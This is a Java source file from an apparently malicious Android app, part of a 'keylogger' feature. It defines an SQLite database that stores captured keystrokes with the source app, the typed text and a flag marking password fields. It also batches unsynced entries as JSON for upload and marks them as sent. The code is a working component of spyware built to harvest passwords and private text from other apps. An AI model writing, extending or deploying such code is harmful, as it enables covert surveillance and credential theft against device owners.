package com.fason.app.features.keylogger;

import android.content.ContentValues;
import android.content.Context;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteOpenHelper;
import android.util.Log;
import org.json.JSONArray;
import org.json.JSONObject;

public class KeystrokeDatabase extends SQLiteOpenHelper {
    private static final String TAG = "KeystrokeDB";
    private static final String DB_NAME = "fason_keylogger.db";
    private static final int DB_VERSION = 2;
    private static final String TABLE = "keystrokes";
    private static final int MAX_ENTRIES = 5000;
    private static volatile KeystrokeDatabase instance;

    public static synchronized KeystrokeDatabase getInstance(Context ctx) {
        if (instance == null) {
            instance = new KeystrokeDatabase(ctx.getApplicationContext());
        }
        return instance;
    }

    private KeystrokeDatabase(Context context) {
        super(context, DB_NAME, null, DB_VERSION);
    }

    @Override
    public void onCreate(SQLiteDatabase db) {
        db.execSQL(
            "CREATE TABLE " + TABLE + " (" +
            "id INTEGER PRIMARY KEY AUTOINCREMENT, " +
            "package TEXT NOT NULL, " +
            "key_text TEXT NOT NULL, " +
            "is_password INTEGER NOT NULL DEFAULT 0, " +
            "event_type TEXT NOT NULL DEFAULT 'text', " +
            "timestamp INTEGER NOT NULL, " +
            "synced INTEGER NOT NULL DEFAULT 0" +
            ")");
        db.execSQL("CREATE INDEX idx_keystrokes_timestamp ON " + TABLE + "(timestamp)");
        db.execSQL("CREATE INDEX idx_keystrokes_synced ON " + TABLE + "(synced)");
        db.execSQL("CREATE INDEX idx_keystrokes_type ON " + TABLE + "(event_type)");
    }

    @Override
    public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion) {
        if (oldVersion < 2) {
            try {
                db.execSQL("ALTER TABLE " + TABLE + " ADD COLUMN event_type TEXT NOT NULL DEFAULT 'text'");
                db.execSQL("CREATE INDEX IF NOT EXISTS idx_keystrokes_type ON " + TABLE + "(event_type)");
            } catch (Exception e) {
                Log.w(TAG, "Migration to v2 failed (column may already exist)", e);
            }
        }
    }

    public long insert(String pkg, String text, boolean isPassword, String eventType, long timestamp) {
        try {
            SQLiteDatabase db = getWritableDatabase();
            ContentValues cv = new ContentValues();
            cv.put("package", pkg);
            cv.put("key_text", text);
            cv.put("is_password", isPassword ? 1 : 0);
            cv.put("event_type", eventType != null ? eventType : "text");
            cv.put("timestamp", timestamp);
            cv.put("synced", 0);
            long id = db.insert(TABLE, null, cv);
            trimIfNeeded(db);
            return id;
        } catch (Exception e) {
            Log.w(TAG, "Insert failed", e);
            return -1;
        }
    }

    public JSONArray getUnsynced(int batchSize) {
        JSONArray result = new JSONArray();
        SQLiteDatabase db = getReadableDatabase();
        try (Cursor cursor = db.query(TABLE, null, "synced = 0", null, null, null,
                 "timestamp ASC", String.valueOf(batchSize))) {
            while (cursor != null && cursor.moveToNext()) {
                JSONObject entry = new JSONObject();
                entry.put("package", cursor.getString(cursor.getColumnIndexOrThrow("package")));
                entry.put("keyText", cursor.getString(cursor.getColumnIndexOrThrow("key_text")));
                entry.put("isPassword", cursor.getInt(cursor.getColumnIndexOrThrow("is_password")) == 1);
                entry.put("eventType", cursor.getString(cursor.getColumnIndexOrThrow("event_type")));
                entry.put("timestamp", cursor.getLong(cursor.getColumnIndexOrThrow("timestamp")));
                entry.put("dbId", cursor.getLong(cursor.getColumnIndexOrThrow("id")));
                result.put(entry);
            }
        } catch (Exception e) {
            Log.w(TAG, "getUnsynced failed", e);
        }
        return result;
    }

    public void markSynced(JSONArray dbIds) {
        if (dbIds == null || dbIds.length() == 0) return;
        try {
            SQLiteDatabase db = getWritableDatabase();
            String[] ids = new String[dbIds.length()];
            StringBuilder placeholders = new StringBuilder();
            for (int i = 0; i < dbIds.length(); i++) {
                ids[i] = String.valueOf(dbIds.getLong(i));
                if (i > 0) placeholders.append(",");
                placeholders.append("?");
            }
            db.execSQL("UPDATE " + TABLE + " SET synced = 1 WHERE id IN (" + placeholders + ")", ids);
        } catch (Exception e) {
            Log.w(TAG, "markSynced failed", e);
        }
    }

    public JSONArray getAll(int limit) {
        return getAll(limit, null);
    }

    public JSONArray getAll(int limit, String eventTypeFilter) {
        JSONArray result = new JSONArray();
        SQLiteDatabase db = getReadableDatabase();
        try (Cursor cursor = (eventTypeFilter != null && !eventTypeFilter.isEmpty())
                 ? db.query(TABLE, null, "event_type = ?", new String[]{eventTypeFilter}, null, null, "timestamp DESC", String.valueOf(limit))
                 : db.query(TABLE, null, null, null, null, null, "timestamp DESC", String.valueOf(limit))) {
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    JSONObject entry = new JSONObject();
                    entry.put("package", cursor.getString(cursor.getColumnIndexOrThrow("package")));
                    entry.put("keyText", cursor.getString(cursor.getColumnIndexOrThrow("key_text")));
                    entry.put("isPassword", cursor.getInt(cursor.getColumnIndexOrThrow("is_password")) == 1);
                    entry.put("eventType", cursor.getString(cursor.getColumnIndexOrThrow("event_type")));
                    entry.put("timestamp", cursor.getLong(cursor.getColumnIndexOrThrow("timestamp")));
                    result.put(entry);
                }
            }
        } catch (Exception e) {
            Log.w(TAG, "getAll failed", e);
        }
        return result;
    }

    public void clearAll() {
        try {
            SQLiteDatabase db = getWritableDatabase();
            db.delete(TABLE, null, null);
        } catch (Exception e) {
            Log.w(TAG, "clearAll failed", e);
        }
    }

    public int getUnsyncedCount() {
        SQLiteDatabase db = getReadableDatabase();
        try (Cursor cursor = db.rawQuery("SELECT COUNT(*) FROM " + TABLE + " WHERE synced = 0", null)) {
            if (cursor != null && cursor.moveToFirst()) {
                return cursor.getInt(0);
            }
            return 0;
        } catch (Exception e) {
            return 0;
        }
    }

    public int getTotalCount() {
        SQLiteDatabase db = getReadableDatabase();
        try (Cursor cursor = db.rawQuery("SELECT COUNT(*) FROM " + TABLE, null)) {
            if (cursor != null && cursor.moveToFirst()) {
                return cursor.getInt(0);
            }
            return 0;
        } catch (Exception e) {
            return 0;
        }
    }

    private void trimIfNeeded(SQLiteDatabase db) {
        try {
            Cursor cursor = db.rawQuery("SELECT COUNT(*) FROM " + TABLE, null);
            int count = 0;
            if (cursor != null && cursor.moveToFirst()) {
                count = cursor.getInt(0);
            }
            if (cursor != null) cursor.close();
            if (count > MAX_ENTRIES) {
                db.execSQL("DELETE FROM " + TABLE + " WHERE id IN (" +
                    "SELECT id FROM " + TABLE + " ORDER BY timestamp ASC LIMIT " + (count - MAX_ENTRIES) + ")");
            }
        } catch (Exception ignored) {}
    }
}
